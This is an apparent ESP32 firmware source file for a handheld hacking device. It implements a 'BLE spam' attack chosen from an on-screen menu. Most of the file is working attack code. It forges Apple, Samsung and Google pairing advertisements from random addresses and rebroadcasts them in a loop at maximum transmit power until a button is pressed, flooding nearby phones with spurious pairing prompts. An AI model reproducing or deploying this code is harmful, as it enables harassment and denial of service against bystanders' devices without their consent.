#include "ble_spam.h"

const char* generate_random_name() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

void generate_random_address(esp_bd_addr_t addr) {
    for (int i = 0; i < 6; i++) {
        addr[i] = esp_random() % 256;
        if (i == 0) {
            addr[i] |= 0xF0; // Ensure the first 4 bits are high
        }
    }
}

void send_adv(esp_ble_adv_params_t adv_params, uint8_t *raw_adv_data, size_t raw_adv_data_len) {
    for (size_t i = 0; i < raw_adv_data_len; i++) {
        printf("0x%02X ", raw_adv_data[i]);
    }
    printf ("\n");

    esp_err_t adv_ret = esp_ble_gap_config_adv_data_raw(raw_adv_data, raw_adv_data_len);
    if (adv_ret != 0) {
        printf ("bad conf");
        return;
    }
    
    esp_ble_gap_start_advertising(&adv_params);
}

void start_advertising(EBLEPayloadType type) {
    esp_bd_addr_t dummy_addr;
    generate_random_address(dummy_addr);
        esp_ble_gap_set_rand_addr(dummy_addr);

    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,                        // Minimum advertising interval
        .adv_int_max = 0x40,                        // Maximum advertising interval
        .adv_type = ADV_TYPE_IND,                   // Advertising type
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,      // Own address type
        .peer_addr = {0},                           // Peer address (initialized to zero)
        .peer_addr_type = BLE_ADDR_TYPE_RANDOM,    // Peer address type
        .channel_map = ADV_CHNL_ALL,                 // Channel map (assuming this is the correct usage)
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY // Advertising filter policy
    };

    uint8_t *raw_adv_data = NULL;
    size_t raw_adv_data_len = 0;

    switch (type) {
        case DEVICE_APPLE: {
            int coin = esp_random() % 2; // long or short model

            if (coin == 0) { // long
                raw_adv_data = IOS_LONG_MODELS[esp_random() % IOS_LONG_COUNT];            

                raw_adv_data_len = 31;
            } else { // short
                raw_adv_data = IOS_SHORT_MODELS[esp_random() % IOS_SHORT_COUNT];            

                raw_adv_data_len = 25;
            }

            send_adv(adv_params, raw_adv_data, raw_adv_data_len);

            break;
        }
        case DEVICE_SAMSUNG: {
            raw_adv_data = SAMSUNG_MODELS[esp_random() % SAMSUNG_COUNT];
            raw_adv_data[14] = (uint8_t)esp_random() % 256;            

            raw_adv_data_len = 15;

            send_adv(adv_params, raw_adv_data, raw_adv_data_len);            

            break;
        }
        case DEVICE_GOOGLE: {
            static uint8_t google_data[] = {
                0x02, 0x01, 0x02,  // Length: 2, Type: Flags, Value: LE General Discoverable Mode and BR/EDR Not Supported
                0x02, 0x0A, 0xEB,  // Length: 2, Type: TX Power Level, Value: -21 dBm (0xEB)
                0x03, 0x03, 0x2C, 0xFE,  // Length: 3, Type: Complete List of 16-bit Service UUIDs, Value: 0x2CFE
                0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00  // Length: 6, Type: Service Data, 16-bit UUID, and data
            };

            raw_adv_data = google_data;
            raw_adv_data_len = 17;

            uint32_t model;
            model = GOOGLE_MODELS[esp_random() % GOOGLE_MODEL_COUNT];            

            raw_adv_data[14] = (model >> 16) & 0xFF;
            raw_adv_data[15] = (model >> 8) & 0xFF;
            raw_adv_data[16] = model & 0xFF;

            send_adv(adv_params, raw_adv_data, raw_adv_data_len);

            break;
        }
        case DEVICE_MICROSOFT: {
            break;
        }
    }
}


int BLESpam() {
/* START BLE */
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
    
    #pragma GCC diagnostic ignored "-Wmissing-field-initializers"
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    #pragma GCC diagnostic pop    
    
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));

    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
/* END */

    int Selector = 0;
    struct menu Menu;

    Menu.name = "~/BLE/BleSpm";
    Menu.length = 2;  // devices, statack
    Menu.elements = new item[Menu.length];

    strcpy(Menu.elements[0].name, "Devices");
    Menu.elements[0].type = 0;
    Menu.elements[0].length = 5;
    Menu.elements[0].selector = 0;
    Menu.elements[0].options[0] = "APPLE";
    Menu.elements[0].options[1] = "SAMSUNG";
    Menu.elements[0].options[2] = "GOOGLE";
    Menu.elements[0].options[3] = "MICROSOFT";
    Menu.elements[0].options[4] = "ALL";
    Menu.elements[0].options[5] = NULL;


    strcpy(Menu.elements[1].name, "Start attack");
    Menu.elements[1].type = 1;
    Menu.elements[1].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[1].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    while (1) {
        updateBoard();
        if (anyPressed()) {
            if (returnPressed()) {
/* STOP BLE */
                ESP_ERROR_CHECK(esp_bluedroid_disable());
                ESP_ERROR_CHECK(esp_bluedroid_deinit());
                ESP_ERROR_CHECK(esp_bt_controller_disable());
                ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
/* END */

                vTaskDelay(pdMS_TO_TICKS(300));

                return 0;
            }
            else if (upPressed()) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (downPressed()) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (leftPressed() && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (rightPressed()  && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (selectPressed()) {
                vTaskDelay(pdMS_TO_TICKS(300));
                clearScreen();
                switch (Selector) {
                    case 1: // Start attack
                        vTaskDelay(pdMS_TO_TICKS(100));

                        displayText(0, 0, "Spamming!!!", TFT_WHITE);

                        if (Menu.elements[Selector].selector == 4) { // all
                            choice = static_cast<EBLEPayloadType>(esp_random() % 4);
                        } else {
                            choice = (EBLEPayloadType)Menu.elements[0].selector;
                        }
                        int wait = 1;
                        while (wait) {
                            updateBoard();
                            if (anyPressed()) {
                                wait = 0;
                            }

                            start_advertising(choice);

                            vTaskDelay(pdMS_TO_TICKS(delayMilliseconds));
                            esp_ble_gap_stop_advertising();
                        }
                        vTaskDelay(pdMS_TO_TICKS(300));
                        break;
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}
